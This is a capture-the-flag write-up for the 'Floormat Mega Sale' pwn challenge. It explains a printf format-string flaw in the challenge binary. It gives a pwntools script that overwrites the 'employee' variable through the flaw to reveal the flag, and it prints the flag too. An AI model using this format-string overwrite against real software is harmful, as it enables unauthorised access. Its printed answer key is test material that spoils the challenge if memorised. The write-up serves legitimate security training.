https://ctftime.org/event/2446

# Floormat Mega Sale (pwn)

The Floor Mat Store is running a mega sale, check it out!

nc floormatsale.ctf.intigriti.io 1339

## Analysis

`main` @ `0x00401265`
- Uses `scanf("%d)` to read out mat selection
    - If this is 6 we call `employee_access`
- Calls `printf(attacker_controlled_input)`
    - Note that the format string can be found on the stack at `"%10$p"`

`employee_access` @ `0x004011c6`
- Checks if `employee` @ `0x0040408c` is non-zero
    - If it is this code prints the flag

## Solution

1) Select `6. Exclusive Employee-only Mat`
2) Use the attack controlled `printf` to modify `employee` to be non-zero
3) Read the flag during `employee_access`

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./floormat_sale", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("floormatsale.ctf.intigriti.io", 1339)

p.sendlineafter(b"your choice:\r\n", str(6).encode())

payload = fmtstr_payload(10, {elf.sym["employee"]: 1 & 0xff})
p.sendlineafter(b"shipping address:\r\n", payload)

p.readuntil(b"delivered to: ")
print(p.readline()[:-2].decode()) # INTIGRITI{3v3ry_fl00rm47_mu57_60!!}
```

## Flag
`INTIGRITI{3v3ry_fl00rm47_mu57_60!!}`

smiley 2024/11/16
